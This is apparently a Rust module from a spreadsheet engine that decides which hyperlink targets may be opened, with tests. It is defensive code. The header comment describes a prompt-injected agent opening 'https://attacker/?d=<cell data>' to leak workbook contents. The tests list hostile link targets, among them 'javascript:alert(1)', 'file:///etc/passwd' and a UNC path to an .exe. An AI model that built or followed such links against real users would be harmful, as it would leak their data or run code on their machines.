//! Which hyperlink targets may be opened. A cell's link comes from the document (often a file
//! somebody sent), so it is hostile input: only `http`, `https` and `mailto` ever leave the
//! workbook for the system; `file:`, `smb:`, UNC paths, custom URL handlers, `javascript:` and
//! the like are refused. Everything without a scheme stays an in-workbook reference.
//!
//! Opening an allowed address also needs the user's say-so (#2181): `link.open` is reachable by
//! the control channel, the CLI, MCP and workbook scripts, so a prompt-injected agent could open
//! `https://attacker/?d=<cell data>`. Under the default [`LinkPolicy::Confirm`] the command refuses
//! external addresses; only the host, after showing the address and getting OK from the user,
//! opens one through [`crate::Session::open_confirmed_link`], which no command reaches.

use gridcraft_core::{CellError, is_network_link, link_location, link_scheme};
use serde_json::{Value as Json, json};

use crate::{EngineError, Result, Session, UiRequest};

/// Whether `link.open` may hand an external (`http`/`https`/`mailto`) address to the host without
/// asking. Set by the host in code, never by a command, so a programmatic caller can't widen it.
#[derive(Clone, Copy, Debug, Default, PartialEq, Eq)]
pub enum LinkPolicy {
    /// `link.open` refuses external addresses; the user opens them by clicking the link, which
    /// asks first ([`Session::open_confirmed_link`]). References still navigate.
    #[default]
    Confirm,
    /// The host trusts every caller of this session (an embedding that vets requests itself):
    /// `link.open` opens allowed addresses directly. Disallowed schemes stay refused.
    Allow,
}

/// The error a programmatic `link.open` of a web or e-mail address returns.
pub const NEEDS_CONFIRMATION: &str = "Web and e-mail links open only when the user clicks them and confirms; a command can't open them.";

impl Session {
    /// Opens a link the user has just confirmed in the host's "Open Hyperlink" prompt: an allowed
    /// address goes to the host (`UiRequest::OpenUrl`), a reference selects, anything else is
    /// refused ([`classify`]). Not a command: only host code that showed the user this exact
    /// address may call it.
    pub fn open_confirmed_link(&mut self, target: &str) -> Result<Json> {
        match classify(target) {
            LinkKind::Internal(r) => self.execute("edit.goTo", json!({"reference": r})),
            LinkKind::External(u) => {
                self.ui_requests.push(UiRequest::OpenUrl(u.clone()));
                Ok(json!({"opened": u}))
            }
            LinkKind::Refused(why) => Err(EngineError::Other(why)),
        }
    }
}

/// What a link target is.
#[derive(Clone, Debug, PartialEq, Eq)]
pub enum LinkKind {
    /// A cell, range, name or table of the workbook (`Sheet2!A1`, `Total`), without the `#`
    /// marker a target may start with ([`link_location`]).
    Internal(String),
    /// An address to hand to the system, trimmed: `http`, `https` or `mailto` only.
    External(String),
    /// Refused, with the reason to show.
    Refused(String),
}

const ALLOWED: [&str; 3] = ["http", "https", "mailto"];

/// Classifies a link target. Never panics; the single place that decides what may be opened.
pub fn classify(target: &str) -> LinkKind {
    let t = target.trim();
    if t.chars().any(char::is_control) {
        return LinkKind::Refused("The link contains control characters.".into());
    }
    if is_network_link(t) {
        return LinkKind::Refused("Links to network locations aren't opened.".into());
    }
    // The scheme test below reads the whole target: `#http://…` stays an in-workbook name.
    let place = link_location(t);
    // A broken link location is not a `#`-prefixed name (e.g. NAME? is a valid name).
    if CellError::parse(place).is_some() {
        return LinkKind::Refused("Reference isn't valid.".into());
    }
    if place.starts_with('#') {
        return match gridcraft_core::addr::hash_sheet_location(place) {
            Some((sheet, body)) => LinkKind::Internal(format!("{}!{body}", gridcraft_core::quote_sheet(sheet))),
            None => LinkKind::Refused("Reference isn't valid.".into()),
        };
    }
    let Some(scheme) = link_scheme(t) else { return LinkKind::Internal(place.to_string()) };
    let rest = t.get(scheme.len() + 1..).unwrap_or_default();
    let lower = scheme.to_ascii_lowercase();
    if ALLOWED.contains(&lower.as_str()) && !rest.trim().is_empty() {
        LinkKind::External(t.to_string())
    } else {
        LinkKind::Refused(format!("Links of type \"{lower}:\" aren't opened. Only http, https and mailto links are allowed."))
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn only_http_https_and_mailto_leave_the_workbook() {
        for ok in ["http://a.example/x", "HTTPS://A.example", "  https://a.example  ", "MailTo:a@b.example"] {
            assert!(matches!(classify(ok), LinkKind::External(_)), "{ok}");
        }
        assert_eq!(classify(" https://a.example "), LinkKind::External("https://a.example".into()));
        for bad in [
            "javascript:alert(1)",
            "JaVaScRiPt:alert(1)",
            "file:///etc/passwd",
            "smb://host/share",
            "ms-excel:ofe|u|http://x",
            "\\\\host\\share\\x.exe",
            "//host/share",
            "C:\\Windows\\calc.exe",
            "\tjavascript:1",
            "java\nscript:1",
            "\u{1}http://a.example",
            "http:",
            "mailto:",
            "x-custom://a",
        ] {
            assert!(matches!(classify(bad), LinkKind::Refused(_)), "{bad:?} -> {:?}", classify(bad));
        }
    }

    #[test]
    fn references_stay_internal() {
        for r in ["Sheet2!A1", "'My Sheet'!B2:C3", "A1:B2", "#Sheet1!A1", "Total", "", "   "] {
            assert!(matches!(classify(r), LinkKind::Internal(_)), "{r:?} -> {:?}", classify(r));
        }
    }

    #[test]
    fn error_locations_cannot_be_followed_as_names() {
        for r in ["#NAME?", "#REF!", "#Name?", "##NAME?", "##REF!", " ##ref! "] {
            assert_eq!(classify(r), LinkKind::Refused("Reference isn't valid.".into()), "{r:?}");
        }
        for (r, place) in
            [("#Sheet1!A1", "Sheet1!A1"), ("##Sheet1!A1", "'#Sheet1'!A1"), ("NAME?", "NAME?"), ("#http://a.example", "http://a.example")]
        {
            assert_eq!(classify(r), LinkKind::Internal(place.into()), "{r:?}");
        }
    }

    #[test]
    fn hash_locations_follow_only_a_literal_sheet_reference() -> Result<()> {
        let mut s = Session::new();
        s.new_workbook();
        s.execute("sheet.rename", json!({"name": "Data"}))?;
        assert!(s.execute("link.open", json!({"target": "##Data!A1"})).is_err());
        s.execute("link.open", json!({"target": "#Data!A1"}))?;
        s.execute("sheet.rename", json!({"name": "#Data"}))?;
        let unquoted = s.execute("link.open", json!({"target": "##Data!A1"}))?;
        assert_eq!(s.open_confirmed_link("#'#Data'!A1")?, unquoted);
        assert!(s.take_ui_requests().is_empty());
        assert_eq!(classify("##Something"), LinkKind::Refused("Reference isn't valid.".into()));
        Ok(())
    }

    /// Through an XLSX save that repairs a table name and the reopen, a doubled marker before an
    /// error token still classifies as the broken reference it is.
    #[test]
    fn doubled_error_locations_stay_refused_through_a_repairing_save() -> Result<()> {
        let mut s = Session::new();
        s.new_workbook();
        s.execute("range.setValues", json!({"range": "A1:A2", "values": [["Header"], [1]]}))?;
        s.execute("insert.table", json!({"range": "A1:A2", "name": "DataRows"}))?;
        let doc = s.doc_mut()?;
        let sheet = std::sync::Arc::make_mut(&mut doc.wb).sheet_mut(0).ok_or(EngineError::Other("missing sheet".into()))?;
        sheet.tables[0].name = "Data?Rows".into();
        let links = [("##NAME?", false), ("##REF!", false), ("#NAME?", false), ("#Sheet1!A2", true)];
        for (row, (target, _)) in (0u32..).zip(links) {
            sheet
                .hyperlinks
                .insert(gridcraft_core::CellRef::new(row, 2), gridcraft_model::Hyperlink { target: target.into(), tooltip: None, external: false });
        }
        let saved = gridcraft_xlsx::write_xlsx(&s.doc()?.wb).map_err(|e| EngineError::Other(e.to_string()))?;
        let (back, _) = gridcraft_xlsx::read_xlsx(&saved).map_err(|e| EngineError::Other(e.to_string()))?;
        assert_eq!(back.sheets[0].tables[0].name, "Data_Rows");
        for (row, (target, internal)) in (0u32..).zip(links) {
            let kind = classify(&back.sheets[0].hyperlinks[&gridcraft_core::CellRef::new(row, 2)].target);
            assert_eq!(matches!(kind, LinkKind::Internal(_)), internal, "{target:?} -> {kind:?}");
            assert!(internal || kind == LinkKind::Refused("Reference isn't valid.".into()), "{target:?} -> {kind:?}");
        }
        Ok(())
    }

    /// An internal link whose place reads like a URL stays internal through an XLSX save and
    /// reopen, so following it never hands the text to the system; a web link stays external.
    #[test]
    fn url_like_internal_links_stay_internal_through_xlsx() -> Result<()> {
        let mut wb = gridcraft_model::Workbook::new();
        let links = [("#http://a.example", false), ("https://a.example/x", true), ("mailto:me@a.example", true)];
        let sheet = wb.sheet_mut(0).ok_or(EngineError::Other("missing sheet".into()))?;
        for (row, (target, external)) in (0u32..).zip(links) {
            sheet
                .hyperlinks
                .insert(gridcraft_core::CellRef::new(row, 0), gridcraft_model::Hyperlink { target: target.into(), tooltip: None, external });
        }
        let saved = gridcraft_xlsx::write_xlsx(&wb).map_err(|e| EngineError::Other(e.to_string()))?;
        let (back, _) = gridcraft_xlsx::read_xlsx(&saved).map_err(|e| EngineError::Other(e.to_string()))?;
        for (row, (target, external)) in (0u32..).zip(links) {
            let link = &back.sheets[0].hyperlinks[&gridcraft_core::CellRef::new(row, 0)];
            assert_eq!((link.target.as_str(), link.external), (target, external));
            assert_eq!(matches!(classify(&link.target), LinkKind::Internal(_)), !external, "{target}");
        }
        Ok(())
    }
}
